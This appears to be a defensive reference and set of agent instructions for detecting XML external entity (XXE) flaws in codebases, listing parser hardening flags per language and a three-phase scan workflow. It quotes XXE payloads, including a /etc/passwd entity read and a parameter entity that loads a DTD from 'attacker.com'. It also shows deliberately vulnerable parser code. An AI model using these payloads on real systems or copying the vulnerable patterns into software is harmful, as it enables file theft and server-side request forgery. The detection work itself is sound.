---
subject: "XXE detection reference for SAST subagents: definition, scope boundaries, CWE-611/776/827, attack surface beyond REST XML (SOAP, SAML, SVG, Office), per-stack vulnerable/secure parser recipes, prevention patterns and guidance, dynamic payloads incl. blind OOB, three-phase execution, OWASP mapping."
index:
  - anchor: xxe-detection
    what: "Focused XXE detection role using the three-phase subagent approach — recon, batched verify, merge — gated on the architecture report."
    problem: "Codebase needs systematic sweep of every XML parser for entity-resolution hardening, yet unstructured hunting misses parsing sites and drowns reviewers in unverified candidates; detection orchestration, phase pipeline, verified findings, audit rigor, methodical triage, candidate flood, coverage goal."
    use_when: "XXE scan selected by the screener; `{{ REPORTS_ROOT }}/01_architecture.md` exists; full three-phase detection must run."
    avoid_when: "Architecture report missing — run analysis first; only conceptual XXE knowledge is needed, not execution."
    expected: "Verified XXE findings consolidated into the module report with false positives filtered."
  - anchor: xxe-definition
    what: "Core definition: parser resolving external entities from attacker XML, enabling file read, SSRF, entity-expansion DoS, and occasional command execution."
    problem: "Reviewers disagree on what counts as external-entity injection without shared root cause, so hardened parsers get flagged while default configurations slip; concept baseline, shared vocabulary, classification consistency, definition anchor, dtd processing, entity resolution, term alignment."
    use_when: "Onboarding to the scan; deciding whether a parsing path belongs to XXE at all; teaching the DTD-vs-content boundary."
    avoid_when: "Concrete stack recipes are needed — jump to the matching example anchor; execution workflow is the question."
    expected: "Everyone applies one definition: untrusted documents parsed with external-reference resolution switched on."
  - anchor: xxe-scope-in
    what: "Positive XXE catalog: default-enabled resolvers, SYSTEM file/http entities, parameter-entity DTD injection, XInclude, SSRF chaining, error-based and blind variants."
    problem: "Detectors under-report when vulnerable parser defaults stay implicit, missing parameter entities, XInclude paths, and out-of-band exfiltration across frameworks; inclusion rules, sink inventory, coverage completeness, missed callsites, hidden vectors, recon breadth, primitive coverage."
    use_when: "Building or checking a recon site list; unsure whether a construct qualifies; calibrating false negatives."
    avoid_when: "Exclusions and class boundaries are the question — see the scope-out anchor; prevention patterns wanted."
    expected: "Every entity-capable construct is recognized during recon."
  - anchor: xxe-scope-out
    what: "Boundary rules separating XXE from XSS, generic SSRF, server-controlled config parsing, and default-safe parsers like defusedxml."
    problem: "Findings get misrouted when adjacent classes blur into entity injection, corrupting severity and ownership across scans, with safe defaults wrongly flagged; misrouting risk, class confusion, double reporting, ownership clarity, dedup discipline, triage errors, category overlap, fuzzy edges."
    use_when: "A finding could belong to another scan class; triaging overlapping categories; judging parser defaults."
    avoid_when: "Positive sinks are needed — see the scope-in anchor; prevention patterns wanted."
    expected: "Each candidate lands in exactly one class, with safe-default parsers correctly cleared."
  - anchor: xxe-cwe-references
    what: "CWE mapping for XXE findings: CWE-611 primary, CWE-776 expansion, CWE-827 DTD control, CWE-20, CWE-502, CWE-918."
    problem: "Wrong CWE assignment breaks downstream tooling and metrics, especially when expansion attacks and SSRF chaining blur categories; weakness taxonomy, cwe 611, misclassification risk, tooling accuracy, identifier precision, reporting feeds, scanner alignment."
    use_when: "Assigning CWE identifiers to findings."
    avoid_when: "OWASP risk mapping is the question — see the OWASP anchor."
    expected: "Each finding carries the most specific CWE identifier."
  - anchor: xxe-attack-surface
    what: "Parsing-entry catalog beyond REST XML: SOAP/WSDL, SAML, RSS, SVG, Office documents, config files, and dependency-mediated XML."
    problem: "Teams hunt only explicit application/xml endpoints and miss document uploads, federation payloads, and transitive parsing that widen exposure invisibly; surface inventory, soap services, saml flows, office ingest, hidden consumers, transitive reach, endpoint blindness."
    use_when: "Scoping recon; enumerating every place XML enters the system."
    avoid_when: "Per-stack parser flags are the question — see the examples anchor; execution workflow wanted."
    expected: "Recon covers every XML entry path, not just obvious REST bodies."
  - anchor: xxe-prevention-patterns
    what: "Safe parser constructions per stack: Java DOM/SAX/StAX feature flags, defusedxml, lxml hardened, PHP libxml rules incl. PHP 8 defaults, .NET Prohibit, safe Node libraries."
    problem: "Verify subagents need authoritative hardened configurations to avoid flagging secured parsers, and scattered flag knowledge produces false positives everywhere; flag syntax, hardened factories, secure defaults, false-positive control, mitigation catalog, guard patterns, baseline configs."
    use_when: "Classifying a candidate as mitigated; comparing site code against known-safe configurations; writing remediation notes."
    avoid_when: "Vulnerable examples per stack are the need — see the examples anchor; guidance checklist detail wanted."
    expected: "Feature-disabled or default-safe parsers correctly classified as not vulnerable."
  - anchor: xxe-examples
    what: "Per-stack vulnerable/secure parser pairs: Python stdlib and lxml, Java DOM/SAX/StAX, PHP, .NET, Node.js, Ruby, Go."
    problem: "Parser defaults differ per library and runtime, and generic entity rules miss stack-specific flags like LIBXML_NOENT, resolve_entities, and DtdProcessing; stack recipes, library specifics, api surface, precise detection, pattern matching, flag diversity, call variants."
    use_when: "Target uses one of the covered stacks; reviewing XML parse call sites."
    avoid_when: "Attack-surface enumeration is the question — see that anchor; conceptual definitions wanted."
    expected: "Stack-specific dangerous calls flagged; hardened configurations verified."
  - anchor: xxe-execution
    what: "Three-phase execution: structural recon for unhardened parsers, batched taint verify in groups of three, merge into the final module report."
    problem: "Detection work without orchestration duplicates effort, loses batch boundaries, and merges findings inconsistently; execution model, phase overview, subagent orchestration, context passing, batch discipline, workflow entry, staging, dispatch plan, consolidation, handoff clarity."
    use_when: "Starting the XXE scan execution; dispatching or reviewing any phase."
    avoid_when: "Conceptual XXE knowledge is the need — see definition and examples anchors."
    expected: "All three phases run with shared architecture context into one consolidated report."
  - anchor: xxe-owasp-mapping
    what: "Mapping of XXE findings to OWASP API 2023 risks, routed via API8 and API10 with upload cross-mapping."
    problem: "Findings need correct 2023-era taxonomy for reporting, and assuming dedicated injection categories mislabels everything downstream; taxonomy mapping, risk routing, classification accuracy, edition awareness, correct tagging, traceability, category shift, risk labels."
    use_when: "Tagging findings with OWASP 2023 risks; writing the report's risk section."
    avoid_when: "CWE-level tagging is the question — see the CWE anchor."
    expected: "Findings mapped to the correct risks with explicit reasoning."
  - anchor: xxe-prevention-guidance
    what: "Seven-step hardening checklist: prefer JSON, patch parsers, disable DTD, validate input, check XSD side effects, limit egress, sanitize error output."
    problem: "Remediation advice scattered across parser docs leaves gaps that let one missed control reopen entity resolution; remediation checklist, control mapping, defense completeness, gap elimination, hardening steps, cheat sheet, systematic mitigation, closure guarantee."
    use_when: "Writing remediation; reviewing whether defenses are complete."
    avoid_when: "Per-stack flag syntax is the question — see prevention patterns; detection mechanics wanted."
    expected: "Every finding closes with a complete, layered control set."
  - anchor: xxe-dynamic-payloads
    what: "Payload catalog: in-band file read, HTTP entity PoC, error-based extraction, and blind out-of-band DTD exfiltration."
    problem: "Suspected parsers stay unconfirmed without concrete entity payloads, and generic doctype strings fail against specific stacks and filters; confirmation testing, platform variants, exfil channels, verification evidence, dynamic proof, sink matching, proof strings."
    use_when: "Confirming a suspected parser during verify; choosing payload forms per stack."
    avoid_when: "Static analysis is sufficient for the finding; recon stage not done."
    expected: "Each suspected parser gets a matching confirmation payload."
  - anchor: xxe-important-reminders
    what: "Closing operational reminders: phase ordering, batch discipline, parser-default knowledge, LIBXML_NOENT trap, XInclude separation, and cleanup rules."
    problem: "Modules close with inconsistent final guidance, letting dismissed blind findings or wrong flag assumptions slip into reports; closing rules, quality floor, consistency, final reminders, weak evidence, uniform endings, wrap discipline, audit closure."
    use_when: "Finalizing the module report; reviewing closing guidance."
    avoid_when: "Detection or execution is the current stage — finish those first."
    expected: "Reports close with uniform final rules applied."
---

# XML External Entity (XXE) Detection

[ref: #xxe-detection]

You are performing a focused security assessment to find XXE vulnerabilities in a codebase. This skill uses a three-phase approach with subagents: **recon** (find XML parsing sites where external entities are not safely disabled), **batched verify** (trace whether user-supplied input reaches those parsers, in parallel batches of 3), and **merge** (consolidate batch results into one report).

**Prerequisites**: `{{ REPORTS_ROOT }}/01_architecture.md` must exist. Run the analysis skill first if it doesn't.

**Subagent constraint**: Subagents MUST NOT modify project source code. They are authorized only to read code and write findings to the designated report files.

***

## What is XXE
[ref: #xxe-definition]

XXE occurs when an XML parser processes a document containing a reference to an external entity and the parser has external entity resolution enabled. An attacker who can supply XML input can use this to read arbitrary local files, perform server-side request forgery (internal network probing), trigger denial-of-service via entity expansion (Billion Laughs), or in some stacks execute OS commands.

The core pattern: *user-controlled XML reaches an XML parser that has not disabled DTD processing or external entity resolution.*

### What XXE IS
[ref: #xxe-scope-in]

- XML parsed with external entity resolution **enabled by default** and no explicit hardening applied
- `SYSTEM` entity declarations that reference `file://` or `http://` URIs: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- DTD processing not explicitly disabled in parsers where it is on by default (Java DOM/SAX, PHP SimpleXML/DOMDocument, libxml2-backed parsers)
- Parameter entity injection in DTDs: `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;`
- XInclude injection when XInclude processing is enabled
- SSRF via XXE: using `http://` or `https://` external entity URLs to reach internal services
- Error-based XXE: the parser returns file contents or internal paths in verbose error messages
- Blind XXE via out-of-band exfiltration (DNS, HTTP callback to attacker-controlled servers) when the response does not contain entity output

### What XXE is NOT
[ref: #xxe-scope-out]

Do not flag these as XXE:

- **XSS via XML**: XML data rendered as HTML without escaping — that's XSS
- **SSRF via non-XML**: HTTP requests triggered by other mechanisms — that's SSRF
- **XML parsing of fully server-controlled data**: Config files, bundled resources, migration scripts with no user influence — not exploitable
- **Safe parsers**: Libraries that disable external entities by default and provide no way to re-enable them (e.g. `defusedxml` in Python, `nokogiri` with default settings in Ruby for untrusted input)

### CWE References
[ref: #xxe-cwe-references]

Map findings to the most specific applicable CWE:

| CWE | Name | When to use |
| --- | --- | --- |
| **CWE-611** | Improper Restriction of XML External Entity Reference | Primary mapping for classic XXE (external entity resolution enabled). |
| **CWE-776** | Improper Restriction of Recursive Entity References in DTDs | Billion Laughs / exponential entity expansion / quadratic blowup. |
| **CWE-827** | Improper Control of Document Type Definition | DTD processing is allowed when it should be disabled. |
| **CWE-20** | Improper Input Validation | Accepting untrusted XML or XML-derived formats without hardening or allowlisting. |
| **CWE-502** | Deserialization of Untrusted Data | XML deserialization of arbitrary objects (e.g., Java `Object` streams wrapped in XML, .NET `XmlSerializer` to gadget types). |
| **CWE-918** | Server-Side Request Forgery | XXE used to make the parser issue outbound `http://`/`https://` requests to internal or attacker-controlled hosts. |

### Attack Surface Coverage
[ref: #xxe-attack-surface]

XXE is not limited to REST endpoints that accept `application/xml`. Review every path where user-supplied XML or XML-based content is parsed.

#### SOAP / REST XML endpoints
SOAP services inherently parse XML. Any WSDL/SOAP body can carry a DTD with external entities if the underlying SOAP framework has not disabled DTD processing.

- Detection signal: `Content-Type: text/xml` or `application/soap+xml`; Spring `WebServiceTemplate`; JAX-WS / JAX-RS XML message converters; ASP.NET SOAP handlers.
- Taint trace: request body → SOAP envelope parser → XML parser.

#### SVG file-upload XXE
SVG is XML. Image-processing endpoints that accept `.svg` uploads and pass them through an XML parser are vulnerable if DTDs/entities are resolved.

- Detection signal: file upload with `.svg` extension; usage of `lxml`, `libxml2`, ImageMagick, or browser-side SVG libraries on the server.
- Taint trace: uploaded file bytes → SVG sanitizer/thumbnailer → XML parser.

#### Office document parsers (DOCX, XLSX, ODT)
DOCX/XLSX are ZIP archives containing OOXML, which is XML. ODT uses ODF XML. Document preview, indexing, or conversion services that unzip and parse these files may resolve external entities if the parser is not hardened.

- Detection signal: APIs that accept `.docx`, `.xlsx`, `.odt`, or `.pptx`; usage of `python-docx`, `openpyxl`, Apache POI, or custom ZIP+XML parsing.
- Taint trace: uploaded office document → unzip → `[Content_Types].xml` / `word/document.xml` → XML parser.

#### XSLT transform XXE
XSLT stylesheets can call `document()` to load arbitrary XML files or URLs. If a user-supplied XSLT is applied, the processor may perform SSRF or local file reads even without a classic `DOCTYPE` declaration.

- Detection signal: `xsltproc`, Saxon, `lxml.xslt`, Java `TransformerFactory`, .NET `XslCompiledTransform`, or Node.js `xslt` modules processing user input.
- Taint trace: uploaded or user-supplied `.xslt` → XSLT processor → `document('file:///etc/passwd')`.

#### XML signature wrapping
Signed XML messages (SAML, WS-Security) can be restructured so that the signature validates over one element while the application logic consumes a different, attacker-controlled element. This is an XML processing logic flaw closely related to XXE workflows.

- Detection signal: SAML assertion endpoints, WS-Security headers, custom XML-signature validation.
- Review: ensure the application uses the element that was actually signed, not a duplicated or wrapped element.

#### JSON-with-XML fallback APIs
APIs that nominally accept JSON but fall back to XML based on `Content-Type`, `Accept`, or a query parameter can have a hardened JSON path and a vulnerable XML path. Attackers switch the content type to `application/xml` to reach the unhardened parser.

- Detection signal: content-negotiation code, framework XML message converters registered alongside JSON converters, or docs mentioning both JSON and XML request formats.
- Taint trace: `Content-Type: application/xml` request → framework XML deserializer → XML parser.

#### Error-based XXE
When the XML parser returns verbose errors containing the expanded entity value or file path, an attacker can exfiltrate data without an out-of-band callback. Treat error-based XXE as a distinct subtype from blind/OOB.

- Detection signal: parser error responses include fragments of local files, environment paths, or XML entity expansion details.
- Example payload:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <foo>&xxe;</foo>
  ```

#### Blind / OOB XXE
The response does not contain entity output. The attacker declares a parameter entity pointing to an attacker-controlled DTD. The DTD declares additional entities that read local files and exfiltrate them via DNS or HTTP requests.

- Detection signal: outbound DNS/HTTP requests from the parser to attacker infrastructure; web logs showing requests with file content in query parameters.

***

## Patterns That Prevent XXE
[ref: #xxe-prevention-patterns]

When you see these patterns, the parser is likely **not vulnerable**:

**1. Disabling DTD / external entities (Java DOM)**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**2. Disabling external entities (Java SAX)**
```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

**3. Disabling external entities (Java StAX / XMLInputFactory)**
```java
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

**4. Python — defusedxml (always safe)**
```python
import defusedxml.ElementTree as ET
tree = ET.parse(source)  # external entities, DTD, entity expansion all blocked
```

**5. Python — lxml with resolve_entities=False**
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(source, parser)
```

**6. PHP — libxml_disable_entity_loader (PHP < 8.0) / LIBXML_NONET flag**
```php
libxml_disable_entity_loader(true);   // PHP 7.x — disables external entity loading
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_NONET);  // LIBXML_NONET blocks network
// Note: LIBXML_NOENT alone EXPANDS entities — it does NOT disable them
```

**PHP 8.0+:** `libxml_disable_entity_loader()` is deprecated — libxml ≥ 2.9 is required and external entity loading is disabled by default, so a stock PHP 8 parser is safe **unless** the code opts back into expansion with `LIBXML_NOENT`, `LIBXML_DTDVALID`, or a custom `libxml_set_external_entity_loader()`. On libxml ≥ 2.13 (PHP 8.4+) the `LIBXML_NO_XXE` parse flag blocks XXE explicitly. Flag any PHP 8 code that re-enables entity expansion.

**7. .NET — XmlReaderSettings with DtdProcessing.Prohibit**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

**8. Node.js — xml2js (safe by default in v0.5+)**
```javascript
const xml2js = require('xml2js');
// xml2js does not resolve external entities by default — safe
xml2js.parseString(xmlInput, callback);
```

**9. Node.js — xmldom (avoid for untrusted XML)**
```javascript
// xmldom does not provide reliable flags to disable DTD/entity resolution.
// Do not use it for untrusted input. Prefer xml2js or fast-xml-parser with security flags.
```

***

## Vulnerable vs. Secure Examples
[ref: #xxe-examples]

### Python — stdlib xml.etree.ElementTree (vulnerable by default in CPython < 3.8 / expat quirks)

```python
# VULNERABLE: ElementTree parses DTDs; stdlib does NOT protect against all XXE
import xml.etree.ElementTree as ET
def parse_data(request):
    xml_data = request.body
    tree = ET.fromstring(xml_data)   # no hardening — expat may resolve entities
    return process(tree)

# SECURE: use defusedxml drop-in replacement
import defusedxml.ElementTree as ET
def parse_data(request):
    xml_data = request.body
    tree = ET.fromstring(xml_data)   # defusedxml blocks all XXE vectors
    return process(tree)
```

### Python — lxml

```python
# VULNERABLE: lxml resolves external entities by default
from lxml import etree
def parse_upload(request):
    data = request.body
    tree = etree.fromstring(data)    # external entities resolved, network access allowed
    return render(tree)

# SECURE: disable entity resolution and network access
from lxml import etree
def parse_upload(request):
    data = request.body
    parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
    tree = etree.fromstring(data, parser)
    return render(tree)
```

### Java — DocumentBuilder (DOM)

```java
// VULNERABLE: default DocumentBuilder resolves external entities
@PostMapping("/import")
public ResponseEntity<?> importXml(@RequestBody String xml) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(new InputSource(new StringReader(xml)));
    return ResponseEntity.ok(process(doc));
}

// SECURE: disable DTD and external entity features
@PostMapping("/import")
public ResponseEntity<?> importXml(@RequestBody String xml) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    dbf.setExpandEntityReferences(false);
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(new InputSource(new StringReader(xml)));
    return ResponseEntity.ok(process(doc));
}
```

### Java — SAXParser

```java
// VULNERABLE: default SAXParser allows external entities
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();
parser.parse(inputStream, handler);

// SECURE: disable external entities
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
SAXParser parser = factory.newSAXParser();
parser.parse(inputStream, handler);
```

### Java — XMLInputFactory (StAX)

```java
// VULNERABLE: default XMLInputFactory supports external entities
XMLInputFactory xif = XMLInputFactory.newInstance();
XMLStreamReader xsr = xif.createXMLStreamReader(inputStream);

// SECURE: disable external entity support
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
XMLStreamReader xsr = xif.createXMLStreamReader(inputStream);
```

### PHP — SimpleXML / DOMDocument

```php
// VULNERABLE: simplexml_load_string with no entity loader disabled
function parseXml($xml) {
    return simplexml_load_string($xml);  // resolves external entities
}

// VULNERABLE: DOMDocument without protection
function parseXml($xml) {
    $doc = new DOMDocument();
    $doc->loadXML($xml);   // external entities enabled by default
    return $doc;
}

// SECURE (PHP 7.x): disable entity loader before parsing
function parseXml($xml) {
    libxml_disable_entity_loader(true);
    $doc = new DOMDocument();
    $doc->loadXML($xml, LIBXML_NONET);
    return $doc;
}
```

### .NET — XmlDocument / XmlTextReader

```csharp
// VULNERABLE: XmlDocument with default XmlUrlResolver resolves external entities
XmlDocument doc = new XmlDocument();
doc.Load(stream);   // external entities resolved

// VULNERABLE: XmlTextReader (legacy) — DTD processing on by default in old .NET
XmlTextReader reader = new XmlTextReader(stream);

// SECURE: XmlDocument with null resolver and prohibited DTD
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;   // disables external entity resolution
doc.Load(stream);

// SECURE: XmlReader with DtdProcessing.Prohibit
XmlReaderSettings settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};
XmlReader reader = XmlReader.Create(stream, settings);
```

### Node.js — libxmljs

```javascript
// VULNERABLE: libxmljs parses with entity resolution on by default
const libxml = require('libxmljs');
app.post('/parse', (req, res) => {
    const doc = libxml.parseXmlString(req.body);
    res.send(doc.toString());
});

// SAFER: no built-in safe flag — avoid libxmljs for untrusted input entirely
// Prefer xml2js or a non-libxml2-backed parser
```

### Node.js — xmldom

```javascript
// VULNERABLE: xmldom does not reliably disable external entity resolution
const { DOMParser } = require('@xmldom/xmldom');
app.post('/parse', (req, res) => {
    const doc = new DOMParser().parseFromString(req.body, 'text/xml');
    res.send(doc.toString());
});

// SECURE: do not use xmldom for untrusted XML; use xml2js or fast-xml-parser with security flags
```

### Ruby — Nokogiri

```ruby
# VULNERABLE: Nokogiri with NOENT option enables entity substitution
def parse_xml(xml_input)
  Nokogiri::XML(xml_input) { |config| config.noent }
end

# SECURE: default Nokogiri (no options) — safe for untrusted input
def parse_xml(xml_input)
  Nokogiri::XML(xml_input)
end
```

### Go — encoding/xml

```go
// VULNERABLE: Go's encoding/xml does not resolve external entities
// but if combined with a third-party parser like etree with network enabled:
import "github.com/beevik/etree"

func parseXML(data []byte) {
    doc := etree.NewDocument()
    doc.ReadFromBytes(data)   // check library's entity resolution behaviour
}

// Go's standard encoding/xml: does not resolve external entities — generally safe.
// Flag only if a third-party XML library with entity support is used.
```

***

## Execution
[ref: #xxe-execution]

This skill runs in three phases using subagents. Pass the contents of `{{ REPORTS_ROOT }}/01_architecture.md` to all subagents as context.

### Phase 1: Find Vulnerable XML Parsing Sites

Launch a subagent with the following instructions:

> **Goal**: Find every location in the codebase where XML is parsed without external entity resolution being explicitly disabled. Write results to `{{ REPORTS_ROOT }}/07_recon.md`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand the tech stack, XML libraries in use, and any XML-accepting endpoints.
>
> **What to search for — vulnerable XML parsing patterns**:
>
> Flag any XML parsing call where there is **no adjacent, paired hardening** (disabling DTD / external entity features). You are not yet tracing whether the input is user-controlled; that is Phase 2's job.
>
> 1. **Python — stdlib parsers (flag unless defusedxml is used as a drop-in)**:
>    - `xml.etree.ElementTree.parse(...)`, `ET.fromstring(...)`, `ET.iterparse(...)`
>    - `xml.dom.minidom.parseString(...)`, `xml.dom.minidom.parse(...)`
>    - `xml.sax.parseString(...)`, `xml.sax.parse(...)`
>    - `xmltodict.parse(...)` (backed by expat — generally safe for entity expansion, but flag for review)
>
> 2. **Python — lxml (flag unless `resolve_entities=False` and `no_network=True` are set)**:
>    - `etree.parse(...)`, `etree.fromstring(...)`, `etree.XML(...)`
>    - `etree.XMLParser(...)` without `resolve_entities=False`
>    - `objectify.parse(...)`, `objectify.fromstring(...)`
>
> 3. **Java — flag any instantiation of these without the matching hardening features set**:
>    - `DocumentBuilderFactory.newInstance()` → `newDocumentBuilder()` → `parse(...)`
>    - `SAXParserFactory.newInstance()` → `newSAXParser()` → `parse(...)`
>    - `XMLInputFactory.newInstance()` → `createXMLStreamReader(...)`
>    - `TransformerFactory.newInstance()` → `newTransformer()` used with XML source
>    - `SchemaFactory.newInstance(...)` → `newSchema(...)`
>    - Spring: `MarshallingHttpMessageConverter` with `Jaxb2Marshaller` if entity expansion not disabled
>
> 4. **PHP — flag any of these without `libxml_disable_entity_loader(true)` immediately before (PHP 7.x), or without `LIBXML_NONET` flag (PHP 8.x)**:
>    - `simplexml_load_string(...)`, `simplexml_load_file(...)`
>    - `DOMDocument::loadXML(...)`, `DOMDocument::load(...)`
>    - `xml_parse(...)` with `xml_parser_create()`
>    - `SimpleXMLElement::__construct(...)` with raw string
>
> 5. **.NET — flag any of these without `DtdProcessing.Prohibit` and `XmlResolver = null`**:
>    - `new XmlDocument()` followed by `.Load(...)` or `.LoadXml(...)`
>    - `new XmlTextReader(...)` (legacy — DTD on by default in older .NET)
>    - `XPathDocument(...)`, `XDocument.Load(...)`, `XElement.Load(...)`
>    - `XmlReader.Create(...)` without `XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit }`
>
> 6. **Node.js — flag these libraries when parsing untrusted input**:
>    - `libxmljs.parseXmlString(...)`, `libxmljs.parseXml(...)`
>    - `@xmldom/xmldom` `DOMParser.parseFromString(...)` — does not reliably disable entities
>    - `node-expat` parser instantiation
>    - `sax.createStream(...)` / `sax.parser(...)` — check if entity expansion is used
>    - `xml2js.parseString(...)` — generally safe in v0.5+; flag only if `explicitArray` or other options suggest an older version or entity expansion is re-enabled
>
> 7. **Ruby — flag these when used with options that enable entity expansion**:
>    - `Nokogiri::XML(input) { |config| config.noent }` — `noent` enables entity substitution
>    - `REXML::Document.new(input)` — REXML is vulnerable to entity expansion DoS; check for entity expansion usage
>    - `LibXML::XML::Document.string(input)` — check entity options
>
> 8. **Go — flag third-party XML libraries that support entity resolution**:
>    - `github.com/beevik/etree` usage — check if network/entity resolution is configured
>    - Standard `encoding/xml` is generally safe (does not resolve external entities) — flag only if combined with custom entity handling
>
> **What to skip** (these are safe patterns — do not flag):
> - `import defusedxml` used as the XML parser (Python)
> - `etree.XMLParser(resolve_entities=False, no_network=True)` (lxml)
> - Java `DocumentBuilderFactory` with `disallow-doctype-decl` feature set to `true`
> - Java `XMLInputFactory` with `IS_SUPPORTING_EXTERNAL_ENTITIES = false`
> - .NET `XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null }`
> - Nokogiri default usage without `noent` or other entity-expansion options
> - Parsing of fully static, bundled, non-user-influenced XML files (e.g. reading config from disk at startup with no user input involved)
>
> **Output format** — write to `{{ REPORTS_ROOT }}/07_recon.md`:
>
> ```markdown
> # XXE Recon: [Project Name]
>
> ## Summary
> Found [N] XML parsing sites without explicit external entity hardening.
>
> ## Vulnerable Parsing Sites
>
> ### 1. [Descriptive name — e.g., "lxml.etree.fromstring without resolve_entities=False in upload handler"]
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Function / endpoint**: [function name or route]
> - **Parser / library**: [e.g., lxml etree / Java DocumentBuilder / PHP DOMDocument]
> - **Missing hardening**: [what protection is absent — e.g., "resolve_entities not set to False", "disallow-doctype-decl feature not set"]
> - **Input variable(s)**: `var_name` — [brief note on what it appears to be, e.g., "HTTP request body" or "file upload content" or "unknown origin"]
> - **Code snippet**:
>   ```
>   [the XML parsing call and surrounding context]
>   ```
>
> [Repeat for each site]
> ```

### Between Phases: Check Recon Results

After Phase 1 completes, read `{{ REPORTS_ROOT }}/07_recon.md`. If the summary states zero vulnerable parsing sites were found (or the file contains no entries under "Vulnerable Parsing Sites"), **do not launch Phase 2 or Phase 3**. Instead, write the following to `{{ REPORTS_ROOT }}/07_xxe.md`, **delete** `{{ REPORTS_ROOT }}/07_recon.md`, and stop:

```markdown
# XXE Analysis Results: [Project Name]

## Executive Summary
- Parsing sites analyzed: 0
- Vulnerable: 0
- Likely Vulnerable: 0
- Not Vulnerable: 0
- Needs Manual Review: 0

## Findings

No XML parsing sites without explicit external-entity hardening were identified in this codebase.

## Remediation
No XXE remediation required. Continue to ensure that any future XML parsers disable DTD and external entity processing, prefer non-XML formats where possible, and limit outbound connectivity from XML-processing services.
```

Only proceed to Phase 2 if at least one vulnerable parsing site was identified in the recon output.

### Phase 2: Verify — Trace User Input (Batched)

After Phase 1 completes, read `{{ REPORTS_ROOT }}/07_recon.md` and split the entries under "Vulnerable Parsing Sites" into **batches of up to 3 sites each** (use the numbered `###` sections: ### 1., ### 2., etc.). Launch **one subagent per batch in parallel**. Each subagent traces taint only for its assigned sites and writes results to its own batch file.

**Batching procedure** (you, the orchestrator, do this — not a subagent):

1. Read `{{ REPORTS_ROOT }}/07_recon.md` and count the numbered site sections (### 1., ### 2., etc.).
2. Divide them into batches of up to 3. For example, 8 sites → 3 batches (1-3, 4-6, 7-8).
3. For each batch, extract the full text of those site sections from the recon file.
4. Launch all batch subagents **in parallel**, passing each one only its assigned sites.
5. Each subagent writes to `{{ REPORTS_ROOT }}/07_batch_N.md` where N is the 1-based batch number.
6. Identify the project's primary language/framework from `{{ REPORTS_ROOT }}/01_architecture.md` and select **only the matching examples** from the "Vulnerable vs. Secure Examples" section above. For example, if the project uses Java with DocumentBuilder, include only the Java-related examples. Include these selected examples in each subagent's instructions where indicated by `[TECH-STACK EXAMPLES]` below.

Give each batch subagent the following instructions (substitute the batch-specific values):

> **Goal**: For each assigned vulnerable XML parsing site, determine whether a user-supplied value reaches the XML parser. Our goal is to find XXE vulnerabilities. Write results to `{{ REPORTS_ROOT }}/07_batch_[N].md`.
>
> **Your assigned parsing sites** (from the recon phase):
>
> [Paste the full text of the assigned site sections here, preserving the original numbering]
>
> **Context**: You will be given the project's architecture summary. Use it to understand request entry points, middleware, file upload handlers, and how data flows through the application.
>
> **XXE reference — What to look for**:
>
> User-controlled XML must not reach a parser that allows external entity resolution without hardening. Trace each site's XML input back to its origin.
>
> **For each parsing site, trace the XML input variable(s) backwards to their origin**:
>
> 1. **Direct user input** — the XML content is assigned directly from a request source:
>    - HTTP request body (especially `Content-Type: application/xml` or `text/xml` endpoints): `request.body`, `req.body`, `request.data`, `php://input`, `HttpContext.Request.Body`
>    - File uploads: `request.FILES`, `req.file`, `multipart/form-data` fields
>    - HTTP query params or form fields containing XML snippets
>    - URL path parameters that reference XML resources
>
> 2. **Indirect user input** — the XML is derived from user input through transformations or intermediate steps:
>    - A file path supplied by the user is used to open and parse a file
>    - A URL supplied by the user is fetched and the response is parsed as XML
>    - User input is embedded into an XML template before parsing (potential injection into the XML structure itself)
>    - Variable passed through helper functions — trace the full call chain
>
